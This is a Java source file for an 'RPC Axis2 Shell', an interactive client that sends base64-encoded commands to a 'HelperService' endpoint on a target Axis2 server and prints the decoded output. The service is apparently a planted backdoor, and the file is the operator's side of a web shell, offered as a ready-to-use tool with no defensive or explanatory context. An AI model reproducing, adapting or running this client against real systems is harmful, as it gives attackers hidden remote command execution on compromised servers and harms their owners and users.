import javax.xml.namespace.QName;
import java.util.Scanner;
import sun.misc.BASE64Encoder;
import sun.misc.BASE64Decoder;

import org.apache.axis2.AxisFault;
import org.apache.axis2.addressing.EndpointReference;
import org.apache.axis2.client.Options;
import org.apache.axis2.rpc.client.RPCServiceClient;

/*
 basic RPC-based shell for Axis2 POJO deployments
*/
public class rpcshell {
	public static void main(String args[]) throws AxisFault {
		
		if(args.length <= 1){
			System.out.println("RPC Axis2 Shell");
			System.out.println("  [rpcshell.java] {ip} {port}");
			System.exit(1);
		}

		String remote_ip = new String(args[0]);
		String remote_port = new String(args[1]);
		RPCServiceClient sc = new RPCServiceClient();
		Options options = sc.getOptions();
		EndpointReference epr = new EndpointReference(
						String.format("http://%s:%s/axis2/services/HelperService", remote_ip, remote_port));
		options.setTo(epr);

		QName getcmd = new QName("http://helper", "help");

		String input = null;
		Scanner reader = new Scanner(System.in);

		System.out.println("[!] Type !exit to quit");
		do {
			System.out.printf("%s > ", remote_ip);
			input = reader.nextLine();

			if(input.equals("!exit"))
				break;

			try {
				Object[] cmd = new Object[]{new String(zzd(input,2))};
				Class[] ret = new Class[]{String.class};
				Object[] response = sc.invokeBlocking(getcmd, cmd, ret);
				String retr = new String(); 
				if((retr = (String)response[0]) != null){
					System.out.println(zzd(retr,1));
				}
				else {
					System.out.println("[!] No response received!");
				}
			}
			catch(Exception e){
				System.out.printf("[!] Error: %s\n", e);
			}
		} while(true);
	}

	private static String zzd(String msg, int op){
		String emsg = null;
		try{
			switch(op){
				case 1:
					BASE64Decoder d = new BASE64Decoder();
					emsg = new String(d.decodeBuffer(msg));
					break;
				case 2:
					BASE64Encoder e = new BASE64Encoder();
					emsg = e.encode(msg.getBytes("UTF-8"));
					break;
			}
		}
		catch(Exception e){
			emsg = null;
		}

		return emsg;
	}
}
